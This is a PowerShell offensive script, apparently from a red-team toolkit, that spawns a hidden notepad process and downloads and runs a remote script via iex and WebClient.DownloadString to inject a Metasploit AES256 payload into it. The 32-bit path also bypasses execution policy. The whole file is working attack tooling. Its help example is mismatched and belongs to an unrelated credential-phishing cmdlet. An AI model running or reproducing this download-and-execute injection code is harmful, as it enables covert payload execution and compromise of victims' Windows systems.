function Invoke-Msf5Aes256Payload
{
<#
.SYNOPSIS
	Based on arch parameter spawn an hidden notepad process to inject the payload

.DESCRIPTION
	Author: @b4rtik
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.PARAMETER arch
	Architecture to use for injection (Win32,x64)
.EXAMPLE
	C:\PS> Invoke-CredPhisher -type Office -attackerurl http://192.168.1.5/index.html
#>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true, ValueFromPipeline = $true, ValueFromPipelineByPropertyName = $true)]
        [ValidateSet("Win32","x64")]
        [string]
        $arch = "x64"
          )
    
    switch($arch){
        'Win32'{ 
                write-warning 'Run Win32 notepad'
                $procId = Run-Proc32
                &"c:\Windows\syswow64\windowspowershell\v1.0\powershell.exe" -noni -noprofile -Execution bypass "iex((New-Object system.net.webclient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Run-Msf5Aes256Payload.ps1'));Run-Msf5Aes256Payload -ProcessId $procId"
            }
        'x64'  {
                write-warning 'Run x64 notepad'
                iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/b4rtik/PowerTheShell/master/Scripts/Run-Msf5Aes256Payload.ps1')) 
                $procId = Run-Proc64
                Run-Msf5Aes256Payload -ProcessId $procId
            }
    }
}

function Run-Proc32
{ 
    $startinfo = New-Object System.Diagnostics.ProcessStartInfo
    $startinfo.FileName = "C:\Windows\SysWOW64\notepad.exe"
    $startinfo.WindowStyle = 'Hidden'
    $startinfo.CreateNoWindow = $True
    $Proc = [Diagnostics.Process]::Start($startinfo)

    return $Proc.id

}

function Run-Proc64
{ 
    $startinfo = New-Object System.Diagnostics.ProcessStartInfo
    $startinfo.FileName = "C:\Windows\notepad.exe"
    $startinfo.WindowStyle = 'Hidden'
    $startinfo.CreateNoWindow = $True
    $Proc = [Diagnostics.Process]::Start($startinfo)

    return $Proc.id

}